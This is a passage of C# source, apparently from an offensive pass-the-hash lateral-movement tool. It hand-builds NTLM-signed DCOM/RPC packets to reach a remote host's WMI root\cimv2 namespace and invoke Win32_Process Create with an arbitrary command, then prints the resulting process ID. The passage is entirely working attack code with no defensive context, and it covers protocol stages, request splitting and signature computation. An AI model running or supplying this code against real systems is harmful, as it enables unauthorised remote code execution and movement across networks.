                                        case "AlterContext":
                                            byte[] alterContextCallId = new byte[0];
                                            byte[] alterContextContextId = new byte[0];
                                            byte[] alterContextUuid = new byte[0];
                                            string clientStageNext = "";
                                        
                                            switch (sequenceNum[0])
                                            {
                                                case 0:
                                                    alterContextCallId = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    alterContextContextId = new byte[] { 0x02, 0x00 };
                                                    alterContextUuid = new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
                                                    clientStageNext = "Request";
                                                    break;
                                                case 1:
                                                    alterContextCallId = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    alterContextContextId = new byte[] { 0x03, 0x00 };
                                                    alterContextUuid = new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
                                                    clientStageNext = "Request";
                                                    break;
                                                case 6:
                                                    alterContextCallId = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    alterContextContextId = new byte[] { 0x04, 0x00 };
                                                    alterContextUuid = new byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
                                                    clientStageNext = "Request";
                                                    break;
                                            }
                                            packetRpc = PacketRPCAlterContext(assocGroup, alterContextCallId, alterContextContextId, alterContextUuid);
                                            rpc = ConvertFromSortedDictionary(packetRpc);
                                            randomPortStream.Write(rpc, 0, rpc.Length);
                                            randomPortStream.Flush();
                                            randomPortStream.Read(clientReceive, 0, clientReceive.Length);
                                            clientStage = clientStageNext;
                                            break;
                                        case "Request":
                                            {
                                                List<byte> stubData = new List<byte>() { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

                                                switch (sequenceNum[0])
                                                {
                                                    case 0:
                                                        {
                                                            sequenceNum = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 12;
                                                            requestCallId = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x02, 0x00 };
                                                            requestOpNum = new byte[] { 0x03, 0x00 };
                                                            requestUuid = objectUuid2;
                                                            hostnameLength = BitConverter.GetBytes(hostname.Length + 1);
                                                            clientStageNext = "AlterContext";

                                                            if ((hostname.Length % 2) == 1)
                                                                hostBytes = AppendBytes(hostBytes, new byte[] { 0x00, 0x00 });
                                                            else
                                                                hostBytes = AppendBytes(hostBytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });

                                                            stubData.AddRange(causalityIdBytes);
                                                        
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                            stubData.AddRange(hostnameLength);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                            stubData.AddRange(hostnameLength);
                                                            stubData.AddRange(hostBytes);
                                                            stubData.AddRange(processIdBytes);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                        }
                                                        break;
                                                    case 1:
                                                        {
                                                            sequenceNum = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 8;
                                                            requestCallId = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x03, 0x00 };
                                                            requestOpNum = new byte[] { 0x03, 0x00 };
                                                            requestUuid = ipId.ToArray();
                                                            clientStageNext = "Request";
                                                            stubData.AddRange(causalityIdBytes);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                        }
                                                        break;

                                                    case 2:
                                                        {
                                                            sequenceNum = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 0;
                                                            requestCallId = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x03, 0x00 };
                                                            requestOpNum = new byte[] { 0x06, 0x00 };
                                                            requestUuid = ipId.ToArray();
                                                            byte[] namespaceLength = BitConverter.GetBytes(targetShort.Length + 14);
                                                            byte[] namespaceUnicode = Encoding.Unicode.GetBytes("\\\\" + targetShort + "\\root\\cimv2");
                                                            clientStageNext = "Request";

                                                            if ((targetShort.Length % 2) == 1)
                                                                namespaceUnicode = AppendBytes(namespaceUnicode, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                            else
                                                                namespaceUnicode = AppendBytes(namespaceUnicode, new byte[] { 0x00, 0x00 });

                                                            stubData.AddRange(causalityIdBytes);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                            stubData.AddRange(namespaceLength);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                            stubData.AddRange(namespaceLength);
                                                            stubData.AddRange(namespaceUnicode);
                                                            stubData.AddRange(new byte[] { 0x04,0x00,0x02,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,
                                                                                0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x2d,0x00,0x55,0x00,0x53,0x00,
                                                                                0x2c,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00 });
                                                        }
                                                        break;

                                                    case 3:
                                                        {
                                                            sequenceNum = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 8;
                                                            requestCallId = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x00, 0x00 };
                                                            requestOpNum = new byte[] { 0x05, 0x00 };
                                                            requestUuid = objectUuid.ToArray();
                                                            clientStageNext = "Request";
                                                            string data = BitConverter.ToString(clientReceive).Replace("-", "");
                                                            int oxIdIndex = data.IndexOf(oxIdStr);
                                                            int oxidBytesIndex = oxIdIndex / 2;
                                                            ipid2 = clientReceive.SubArray((oxidBytesIndex + 16), 16);
                                                            List<KeyValuePair<string,byte[]>> remRelease = PacketDCOMRemRelease(causalityIdBytes, objectUuid2, ipId.ToArray());
                                                            byte[] stubDataTmp = ConvertFromSortedDictionary(remRelease);
                                                            stubData.Clear();
                                                            stubData.AddRange(stubDataTmp);
                                                        }
                                                        break;

                                                    case 4:
                                                        {
                                                            sequenceNum = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 4;
                                                            requestCallId = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x00, 0x00 };
                                                            requestOpNum = new byte[] { 0x03, 0x00 };
                                                            requestUuid = objectUuid.ToArray();
                                                            clientStageNext = "Request";

                                                            remQueryInterface = ConvertFromSortedDictionary(PacketDCOMRemQueryInterface(causalityIdBytes, ipid2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 }));
                                                            stubData.Clear();
                                                            stubData.AddRange(remQueryInterface);
                                                        }
                                                        break;

                                                    case 5:
                                                        {
                                                            sequenceNum = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 4;
                                                            requestCallId = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x00, 0x00 };
                                                            requestOpNum = new byte[] { 0x03, 0x00 };
                                                            requestUuid = objectUuid.ToArray();
                                                            clientStageNext = "AlterContext";

                                                            remQueryInterface = ConvertFromSortedDictionary(PacketDCOMRemQueryInterface(causalityIdBytes, ipid2, new byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 }));
                                                            stubData.Clear();
                                                            stubData.AddRange(remQueryInterface);
                                                        }
                                                        break;

                                                    case 6:
                                                        {
                                                            sequenceNum = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 0;
                                                            requestCallId = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x04, 0x00 };
                                                            requestOpNum = new byte[] { 0x06, 0x00 };
                                                            requestUuid = ipid2;
                                                            clientStageNext = "Request";

                                                            stubData.AddRange(causalityIdBytes);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00 });
                                                        }
                                                        break;

                                                    case 7:
                                                        {
                                                            sequenceNum = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                            requestFlags = new byte[] { 0x83 };
                                                            requestAuthPadding = 0;
                                                            requestCallId = new byte[] { 0x10, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x04, 0x00 };
                                                            requestOpNum = new byte[] { 0x06, 0x00 };
                                                            requestUuid = ipid2;
                                                            clientStageNext = "Request";

                                                            stubData.AddRange(causalityIdBytes);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00 });
                                                        }
                                                        break;

                                                    default:
                                                        {
                                                            sequenceNum = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                            requestAuthPadding = 0;
                                                            requestCallId = new byte[] { 0x0b, 0x00, 0x00, 0x00 };
                                                            requestContextId = new byte[] { 0x04, 0x00 };
                                                            requestOpNum = new byte[] { 0x18, 0x00 };
                                                            requestUuid = ipid2;
                                                            byte[] stubLength = BitConverter.GetBytes(cmd.Length + 1769).SubArray(0, 2);
                                                            byte[] stubLength2 = BitConverter.GetBytes(cmd.Length + 1727).SubArray(0, 2);
                                                            byte[] stubLength3 = BitConverter.GetBytes(cmd.Length + 1713).SubArray(0, 2);
                                                            byte[] cmdLength = BitConverter.GetBytes(cmd.Length + 93).SubArray(0, 2);
                                                            byte[] cmdLength2 = BitConverter.GetBytes(cmd.Length + 16).SubArray(0, 2);
                                                            byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);

                                                            string cmdPaddingCheck = (cmd.Length / 4).ToString();
                                                        
                                                            if (cmdPaddingCheck.Contains(".75"))
                                                                cmdBytes = AppendBytes(cmdBytes, new byte[] { 0x00 });
                                                            else if (cmdPaddingCheck.Contains(".5"))
                                                                cmdBytes = AppendBytes(cmdBytes, new byte[] { 0x00, 0x00 });
                                                            else if (cmdPaddingCheck.Contains(".25"))
                                                                cmdBytes = AppendBytes(cmdBytes, new byte[] { 0x00, 0x00, 0x00 });
                                                            else
                                                                cmdBytes = AppendBytes(cmdBytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });

                                                            stubData.AddRange(causalityIdBytes);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,
                                                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x55,0x73,0x65,0x72,
                                                                                0x06,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x63,
                                                                                0x00,0x72,0x00,0x65,0x00,0x61,0x00,0x74,0x00,0x65,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 });
                                                            stubData.AddRange(stubLength);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00 });
                                                            stubData.AddRange(stubLength);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x4d,0x45,0x4f,0x57,0x04,0x00,0x00,0x00,0x81,0xa6,0x12,
                                                                                0xdc,0x7f,0x73,0xcf,0x11,0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24,
                                                                                0x12,0xf8,0x90,0x45,0x3a,0x1d,0xd0,0x11,0x89,0x1f,0x00,0xaa,0x00,
                                                                                0x4b,0x2e,0x24,0x00,0x00,0x00,0x00 });
                                                            stubData.AddRange(stubLength2);
                                                            stubData.AddRange(new byte[] { 0x00, 0x00, 0x78, 0x56, 0x34, 0x12 });
                                                            stubData.AddRange(stubLength3);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x02,0x53,
                                                                                0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x04,
                                                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x0b,
                                                                                0x00,0x00,0x00,0xff,0xff,0x03,0x00,0x00,0x00,0x2a,0x00,0x00,0x00,
                                                                                0x15,0x01,0x00,0x00,0x73,0x01,0x00,0x00,0x76,0x02,0x00,0x00,0xd4,
                                                                                0x02,0x00,0x00,0xb1,0x03,0x00,0x00,0x15,0xff,0xff,0xff,0xff,0xff,
                                                                                0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x12,0x04,0x00,0x80,0x00,0x5f,
                                                                                0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53,0x00,0x00,
                                                                                0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x00,0x08,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,
                                                                                0x00,0x00,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,0x69,0x6e,0x65,
                                                                                0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,
                                                                                0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,
                                                                                0x00,0x00,0x49,0x6e,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                                                0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x5e,0x00,0x00,
                                                                                0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0x94,
                                                                                0x00,0x00,0x00,0x00,0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,
                                                                                0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,
                                                                                0x68,0x72,0x65,0x61,0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,
                                                                                0x6e,0x73,0x7c,0x6c,0x70,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,
                                                                                0x69,0x6e,0x65,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,
                                                                                0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
                                                                                0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,
                                                                                0x5e,0x00,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0xca,0x00,
                                                                                0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x8c,0x00,0x00,0x00,0x00,0x49,
                                                                                0x44,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,
                                                                                0x00,0x00,0x00,0x59,0x01,0x00,0x00,0x5e,0x00,0x00,0x00,0x00,0x0b,
                                                                                0x00,0x00,0x00,0xff,0xff,0xca,0x00,0x00,0x00,0x02,0x08,0x20,0x00,
                                                                                0x00,0x8c,0x00,0x00,0x00,0x11,0x01,0x00,0x00,0x11,0x03,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,
                                                                                0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x04,0x00,0x00,0x00,0x00,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,
                                                                                0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x00,0x00,0x73,0x74,
                                                                                0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                                                0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,0x00,0x00,0x00,0x49,0x6e,
                                                                                0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,
                                                                                0x00,0x00,0x85,0x01,0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,
                                                                                0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0xe2,0x01,0x00,0x00,0x00,
                                                                                0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,0x50,0x72,0x6f,0x63,
                                                                                0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,0x68,0x72,0x65,0x61,
                                                                                0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x73,0x7c,0x43,
                                                                                0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x7c,
                                                                                0x6c,0x70,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x44,0x69,0x72,0x65,
                                                                                0x63,0x74,0x6f,0x72,0x79,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,
                                                                                0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,
                                                                                0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,
                                                                                0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,
                                                                                0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,
                                                                                0x2b,0x02,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0xda,0x01,0x00,0x00,
                                                                                0x00,0x49,0x44,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,
                                                                                0x03,0x08,0x00,0x00,0x00,0xba,0x02,0x00,0x00,0xac,0x01,0x00,0x00,
                                                                                0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x2b,0x02,0x00,0x00,0x02,0x08,
                                                                                0x20,0x00,0x00,0xda,0x01,0x00,0x00,0x72,0x02,0x00,0x00,0x11,0x03,
                                                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,
                                                                                0x67,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x50,0x72,0x6f,0x63,0x65,
                                                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x49,0x6e,0x66,0x6f,
                                                                                0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x00,0x00,0x6f,0x62,0x6a,0x65,
                                                                                0x63,0x74,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,
                                                                                0x08,0x00,0x00,0x00,0xef,0x02,0x00,0x00,0x00,0x49,0x6e,0x00,0x0d,
                                                                                0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,
                                                                                0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,
                                                                                0xff,0xff,0x01,0x00,0x00,0x00,0x4c,0x03,0x00,0x00,0x00,0x57,0x4d,
                                                                                0x49,0x7c,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,0x6f,0x63,0x65,
                                                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x00,0x00,0x4d,0x61,
                                                                                0x70,0x70,0x69,0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,
                                                                                0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x29,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,
                                                                                0x00,0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,
                                                                                0x00,0xff,0xff,0x66,0x03,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x44,
                                                                                0x03,0x00,0x00,0x00,0x49,0x44,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,
                                                                                0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,
                                                                                0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0xf5,0x03,0x00,0x00,0x16,
                                                                                0x03,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x66,0x03,0x00,
                                                                                0x00,0x02,0x08,0x20,0x00,0x00,0x44,0x03,0x00,0x00,0xad,0x03,0x00,
                                                                                0x00,0x11,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x6f,0x62,
                                                                                0x6a,0x65,0x63,0x74,0x3a,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,
                                                                                0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70 });
                                                            stubData.AddRange(Enumerable.Repeat<byte>(0x00, 501).ToArray());
                                                            stubData.AddRange(cmdLength);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x0e,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01 });
                                                            stubData.AddRange(cmdLength2);
                                                            stubData.AddRange(new byte[] { 0x00,0x80,0x00,0x5f,0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,
                                                                                0x52,0x53,0x00,0x00 });
                                                            stubData.AddRange(cmdBytes);
                                                            stubData.AddRange(new byte[] { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                                                0x00,0x00,0x00,0x00,0x00,0x00  });

                                                            if (stubData.ToArray().Length < requestSplitIndex)
                                                            {
                                                                requestFlags = new byte[] { 0x83 };
                                                                clientStageNext = "Result";
                                                            }
                                                            else
                                                            {
                                                                requestSplit = true;
                                                                double requestSplitStageFinal = Math.Ceiling((double)(stubData.ToArray().Length / requestSplitIndex));
                                                                if (requestSplitStage < 2)
                                                                {
                                                                    requestLength = stubData.ToArray().Length;
                                                                    stubData = stubData.GetRange(0, requestSplitIndex);
                                                                    requestSplitStage = 2;
                                                                    seqNumCounter = 10;
                                                                    requestFlags = new byte[] { 0x81 };
                                                                    requestSplitIndexTracker = requestSplitIndex;
                                                                    clientStageNext = "Request";

                                                                }
                                                                else if (requestSplitStage == requestSplitStageFinal)
                                                                {
                                                                    requestSplit = false;
                                                                    sequenceNum = BitConverter.GetBytes(seqNumCounter);
                                                                    requestSplitStage = 0;
                                                                    stubData = stubData.GetRange(requestSplitIndexTracker, (stubData.ToArray().Length - requestSplitIndexTracker - 1));
                                                                    requestFlags = new byte[] { 0x82 };
                                                                    clientStageNext = "Results";
                                                                }
                                                                else
                                                                {
                                                                    requestLength = stubData.ToArray().Length - requestSplitIndexTracker;
                                                                    stubData = stubData.GetRange(requestSplitIndexTracker, requestSplitIndex - 1);
                                                                    requestSplitIndexTracker += requestSplitIndex;
                                                                    requestSplitStage++;
                                                                    sequenceNum = BitConverter.GetBytes(seqNumCounter);
                                                                    seqNumCounter++;
                                                                    requestFlags = new byte[] { 0x80 };
                                                                    clientStageNext = "Request";
                                                                }
                                                            }
                                                        }
                                                        break;
                                                }

                                            
                                                packetRpc = PacketRPCRequest(requestFlags, stubData.ToArray().Length, 16, requestAuthPadding, requestCallId, requestContextId, requestOpNum, requestUuid);

                                                if (requestSplit)
                                                packetRpc[packetRpc.FindIndex(a => a.Key.Equals("AllocHint"))] = new KeyValuePair<string, byte[]>("AllocHint", BitConverter.GetBytes(requestLength));

                                                packetNtlmSspVerifier = PacketNTLMSSPVerifier(requestAuthPadding, new byte[] { 0x04 }, sequenceNum);
                                                rpc = ConvertFromSortedDictionary(packetRpc);
                                                ntlmSspVerifier = ConvertFromSortedDictionary(packetNtlmSspVerifier);

                                                List<byte> preHashedRpcBytes = new List<byte>();
                                                preHashedRpcBytes.AddRange(sequenceNum);
                                                preHashedRpcBytes.AddRange(rpc);
                                                preHashedRpcBytes.AddRange(stubData);
                                                preHashedRpcBytes.AddRange(ntlmSspVerifier.SubArray(0, requestAuthPadding + 8));

                                                rpcSignature = md5.ComputeHash(preHashedRpcBytes.ToArray());
                                                rpcSignature = rpcSignature.SubArray(0, 8);

                                                packetNtlmSspVerifier[packetNtlmSspVerifier.FindIndex(a => a.Key.Equals("NTLMSSPVerifierChecksum"))] = new KeyValuePair<string, byte[]>("NTLMSSPVerifierChecksum", rpcSignature);
                                                ntlmSspVerifier = ConvertFromSortedDictionary(packetNtlmSspVerifier);

                                                clientSendList.Clear();
                                                clientSendList.AddRange(rpc);
                                                clientSendList.AddRange(stubData);
                                                clientSendList.AddRange(ntlmSspVerifier);
                                                clientSend = clientSendList.ToArray();
                                                randomPortStream.Write(clientSend, 0, clientSend.Length);
                                                randomPortStream.Flush();

                                            List<byte> clientReceiveList = new List<byte>();
                                            if (!requestSplit)
                                            {
                                                randomPortStream.Read(clientReceive, 0, clientReceive.Length);
                                                clientReceiveList.AddRange(clientReceive);
                                            }

                                                while (randomPortStream.DataAvailable)
                                                {
                                                    randomPortStream.Read(clientReceive, 0, clientReceive.Length);
                                                    clientReceiveList.AddRange(clientReceive);
                                                    Thread.Sleep(10);
                                                }

                                                clientReceive = clientReceiveList.ToArray();
                                                clientStage = clientStageNext;
                                            }
                                            break;
                                        case "Result":
                                            {
                                                List<byte> clientReceiveList = new List<byte>();
                                                clientReceiveList.AddRange(clientReceive);
                                                while (randomPortStream.DataAvailable)
                                                {
                                                    randomPortStream.Read(clientReceive, 0, clientReceive.Length);
                                                    clientReceiveList.AddRange(clientReceive);
                                                    Thread.Sleep(10);
                                                }

                                                clientReceive = clientReceiveList.ToArray();

                                                if (clientReceive[1145] != 9)
                                                    Console.WriteLine("[+] Command executed with process ID {0} on {1}", GetUInt16DataLength(1141, clientReceive), targetLong);
                                                else
                                                    Console.WriteLine("[-] Process did not start, check your command");

                                                clientStage = "Exit";
                                            }
                                            break;
